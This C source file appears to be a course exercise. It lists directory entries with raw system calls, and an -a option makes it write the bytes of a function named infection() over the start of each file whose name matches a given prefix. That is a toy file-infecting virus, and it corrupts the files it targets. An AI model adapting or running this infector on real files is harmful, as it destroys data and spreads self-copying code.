#include "util.h"

#define O_RDONLY 00
#define O_WRONLY 01
#define O_RDWR 02
#define O_APPEND  00002000
#define	O_CREAT		200		/* create if nonexistant */
#define	O_EXCL		800		/* error if already exists */

#define SEEK_SET 00
#define EOF 0
#define STDIN 0
#define STDOUT 1
#define STDERR 2

#define SYS_EXIT 1 //or 55?
#define SYS_READ 3
#define SYS_WRITE 4
#define SYS_OPEN 5
#define SYS_CLOSE 6
#define SYS_LSEEK 19
#define SYS_GETDENTS 141


typedef struct ent{
  int inode;
  int offset;
  short len; 
  char buf[1];
}ent;

/*where is printing the type of the file*/
void infection(int x)
{
    if (x % 2 == 0)
    {
         system_call(SYS_WRITE, STDOUT, "Hello, Infected File\n", 21);
    }
}

void infector(char* file)
{
    int fd;
    fd = system_call(SYS_OPEN, file, O_RDWR, 0777);
    system_call(SYS_WRITE,fd ,infection, (int)infector - (int)infection);
    system_call(SYS_CLOSE, fd);
    
}

int main (int argc, char* argv[])
{
    int debug = 0;
    int prefixMode = 0;
    int attachMode = 0;
    char* prefix;
    int maxSize = 8192;
    char* currDir = ".";
    int i;

    char dirData[maxSize];
    int dirFD = system_call(SYS_OPEN, currDir, O_RDONLY, 0777);
    int dirSize = system_call(SYS_GETDENTS, dirFD, dirData, maxSize);

    for (i = 1; i < argc; i++){
        if(strcmp(argv[i],"-D") == 0)
        {
            debug = 1;
        }
        else if (strncmp(argv[i], "-p", 2) == 0)
        {
            prefix = argv[i] + 2;
            prefixMode = 1;
        }
        else if (strncmp(argv[i], "-a", 2) == 0)
        {
            prefix = argv[i] + 2;
            attachMode = 1;
        }
        
    }

    system_call(SYS_WRITE, STDOUT, "something...\n", 13);

    i = 0;
    ent* e;
    while (i < dirSize)
    {
        e = (ent*)(dirData + i);

         if ((prefixMode && (strncmp(e->buf, prefix, strlen(prefix)) == 0)) || (!prefixMode && !attachMode)){
            system_call(SYS_WRITE, STDOUT, e->buf, strlen(e->buf));
            system_call(SYS_WRITE, STDOUT, "\n", 1);
        }
        else if (attachMode && (strncmp(e->buf, prefix, strlen(prefix)) == 0) ){
            system_call(SYS_WRITE, STDOUT, e->buf, strlen(e->buf));
            system_call(SYS_WRITE, STDOUT, "\n", 1);
            infector(e->buf);

        }
        
            
        if (debug)
        {
            system_call(SYS_WRITE, STDERR, "file length - ", 14);
            system_call(SYS_WRITE, STDERR, itoa((int)e->len), sizeof(short));
            system_call(SYS_WRITE, STDERR, "\n\n", 2);
        }

        i += e->len;
    }
    system_call(SYS_CLOSE, dirFD); /*added close directory*/

    return 0;
}